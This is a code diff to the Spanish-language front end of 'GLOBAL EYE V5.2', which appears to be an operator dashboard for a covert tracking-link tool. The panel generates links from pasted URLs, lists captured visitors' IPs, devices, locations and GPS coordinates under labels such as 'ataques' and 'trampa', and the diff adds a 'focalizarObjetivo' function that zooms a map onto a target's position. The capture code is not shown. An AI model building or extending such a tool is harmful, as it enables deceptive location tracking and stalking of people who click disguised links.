@@ -61,6 +61,14 @@
         .log-title { font-weight: bold; font-size: 14px; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .log-meta { font-size: 11px; color: var(--text-sec); display: flex; align-items: center; gap: 5px; }
         
+        /* BOTÓN DE MAPA INTERNO (NUEVO) */
+        .gps-action-btn { 
+            display: inline-block; margin-top: 8px; padding: 6px 12px; 
+            background: rgba(251, 206, 73, 0.15); color: #fbce49; 
+            border-radius: 8px; font-size: 11px; font-weight: bold; 
+            cursor: pointer; border: 1px solid rgba(251, 206, 73, 0.3);
+        }
+        
         /* SWITCH */
         .row-switch { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 12px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; }
         .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
@@ -81,7 +89,7 @@
 <body>
 
     <div class="header">
-        <h1>GLOBAL EYE <span style="color:var(--accent)">V5</span></h1>
+        <h1>GLOBAL EYE <span style="color:var(--accent)">V5.2</span></h1>
         <div class="status-badge"><div class="dot"></div> LIVE</div>
     </div>
 
@@ -157,65 +165,69 @@
     </div>
 
     <script>
-        // --- MAPA GLOBAL ---
         var map = null;
         var markers = [];
 
         function initMap() {
-            if(map) return; // Si ya existe, no lo creamos de nuevo
-            
-            // Mapa Oscuro (CartoDB DarkMatter)
+            if(map) return;
             map = L.map('map').setView([0, 0], 2);
             L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                 attribution: '&copy; OpenStreetMap &copy; CARTO',
-                subdomains: 'abcd',
-                maxZoom: 20
+                subdomains: 'abcd', maxZoom: 20
             }).addTo(map);
         }
 
         function updateMapPoints(logs) {
             if(!map) return;
-            
-            // Limpiar marcadores viejos
             markers.forEach(m => map.removeLayer(m));
             markers = [];
-
             logs.forEach(log => {
                 if(log.lat && log.lon) {
-                    // Crear pin rojo
                     var circle = L.circleMarker([log.lat, log.lon], {
-                        color: '#ff4757',
-                        fillColor: '#ff4757',
-                        fillOpacity: 0.8,
-                        radius: 8
+                        color: '#ff4757', fillColor: '#ff4757', fillOpacity: 0.8, radius: 8
                     }).addTo(map);
-                    
-                    circle.bindPopup(`<b>${log.ip}</b><br>${log.hora}<br>${log.dispositivo}`);
+                    circle.bindPopup(`<b>${log.ip}</b><br>${log.hora}`);
                     markers.push(circle);
                 }
             });
         }
 
-        // --- NAVEGACIÓN ---
-        function cambiarVista(vista, elem) {
+        // --- FUNCIÓN DE FOCALIZACIÓN AUTOMÁTICA ---
+        function focalizarObjetivo(lat, lon) {
+            // 1. Cambiar pestaña visualmente
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
             
+            document.getElementById('view-map').classList.add('active');
+            // El índice 2 es el botón del mapa
+            document.querySelectorAll('.nav-item')[2].classList.add('active');
+
+            // 2. Cargar mapa y volar
+            setTimeout(() => {
+                initMap();
+                map.invalidateSize(); 
+                cargarLogs(true); // Recargar pines
+                
+                // Vuelo animado
+                map.flyTo([lat, lon], 15, {
+                    animate: true,
+                    duration: 2
+                });
+            }, 100);
+        }
+
+        function cambiarVista(vista, elem) {
+            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
             document.getElementById('view-' + vista).classList.add('active');
             elem.classList.add('active');
             
-            if(vista === 'logs') {
-                cargarLogs();
-            } else if (vista === 'map') {
-                setTimeout(() => {
-                    initMap();
-                    map.invalidateSize(); // Arregla bug de visualización
-                    cargarLogs(true); // Cargar logs para poner los puntos
-                }, 100);
+            if(vista === 'logs') cargarLogs();
+            else if (vista === 'map') {
+                setTimeout(() => { initMap(); map.invalidateSize(); cargarLogs(true); }, 100);
             }
         }
 
-        // --- LÓGICA ---
         async function generarLink() {
             let btn = document.querySelector('.btn-primary');
             let originalText = btn.innerHTML;
@@ -230,7 +242,7 @@
             };
 
             if(!payload.url_destino) { 
-                Swal.fire({icon: 'warning', title: 'Falta el Link', text: 'Pega un enlace de TikTok o YouTube.', background: '#1e1e24', color: '#fff'});
+                Swal.fire({icon: 'warning', title: 'Falta el Link', background: '#1e1e24', color: '#fff'});
                 btn.innerHTML = originalText; return; 
             }
             if(!payload.url_destino.startsWith('http')) payload.url_destino = 'https://' + payload.url_destino;
@@ -241,24 +253,19 @@
                 });
                 let data = await res.json();
                 
-                // ALERTA PRO
                 Swal.fire({
-                    title: '¡Enlace Listo!',
-                    text: data.link,
-                    icon: 'success',
+                    title: '¡Enlace Listo!', text: data.link, icon: 'success',
                     background: '#1e1e24', color: '#fff',
-                    confirmButtonText: 'COPIAR',
-                    confirmButtonColor: '#00ff88'
+                    confirmButtonText: 'COPIAR', confirmButtonColor: '#00ff88'
                 }).then((result) => {
                     if (result.isConfirmed) {
                         navigator.clipboard.writeText(data.link);
                         Swal.fire({position: 'top-end', icon: 'success', title: 'Copiado', showConfirmButton: false, timer: 1500, background: '#1e1e24', color: '#fff'});
                     }
                 });
-                
                 btn.innerHTML = originalText;
             } catch(e) { 
-                Swal.fire({icon: 'error', title: 'Error', text: 'No se pudo conectar al servidor'});
+                Swal.fire({icon: 'error', title: 'Error', text: 'No se pudo conectar'});
                 btn.innerHTML = originalText; 
             }
         }
@@ -268,27 +275,27 @@
                 let res = await fetch('/api/ver_ataques');
                 let data = await res.json();
                 
-                if(updateMap) {
-                    updateMapPoints(data);
-                    return;
-                }
+                if(updateMap) { updateMapPoints(data); return; }
 
                 let container = document.getElementById('logs-container');
                 let html = "";
                 
-                if(data.length === 0) html = "<div style='text-align:center; color:#444; margin-top:40px'>Sin registros de inteligencia.</div>";
+                if(data.length === 0) html = "<div style='text-align:center; color:#444; margin-top:40px'>Sin registros.</div>";
                 
                 data.forEach(log => {
                     let icon = "laptop";
                     if(log.dispositivo.includes("iPhone")) icon = "phone_iphone";
                     else if(log.dispositivo.includes("Android")) icon = "android";
                     
-                    let statusColor = "var(--text-sec)";
+                    let gpsBtn = "";
                     let gpsIcon = "";
                     
                     if(log.lat && log.lon) {
-                        statusColor = "var(--danger)"; // Rojo si hay GPS
                         gpsIcon = `<span style="color:var(--danger); font-size:12px; margin-left:5px;">● GPS</span>`;
+                        // Botón que llama a la función de vuelo
+                        gpsBtn = `<div class="gps-action-btn" onclick="focalizarObjetivo(${log.lat}, ${log.lon})">
+                            📍 VER EN MAPA
+                        </div>`;
                     }
 
                     html += `
@@ -296,8 +303,9 @@
                         <div class="log-icon"><span class="material-icons-round">${icon}</span></div>
                         <div class="log-info">
                             <div class="log-title">${log.ubicacion} ${gpsIcon}</div>
-                            <div class="log-meta" style="color:${statusColor}">${log.ip}</div>
+                            <div class="log-meta" style="color:var(--text-sec)">${log.ip}</div>
                             <div class="log-meta">🕒 ${log.hora} • 🎯 ${log.trampa}</div>
+                            ${gpsBtn}
                         </div>
                     </div>`;
                 });
@@ -307,14 +315,9 @@
 
         async function borrarHistorial() {
             Swal.fire({
-                title: '¿Estás seguro?',
-                text: "Se eliminarán todos los registros de inteligencia.",
-                icon: 'warning',
-                showCancelButton: true,
-                confirmButtonColor: '#ff4757',
-                cancelButtonColor: '#333',
-                confirmButtonText: 'Sí, borrar todo',
-                background: '#1e1e24', color: '#fff'
+                title: '¿Estás seguro?', text: "Se eliminarán todos los registros.", icon: 'warning',
+                showCancelButton: true, confirmButtonColor: '#ff4757', cancelButtonColor: '#333',
+                confirmButtonText: 'Sí, borrar', background: '#1e1e24', color: '#fff'
             }).then(async (result) => {
                 if (result.isConfirmed) {
                     await fetch('/api/borrar_logs', { method: 'POST' });
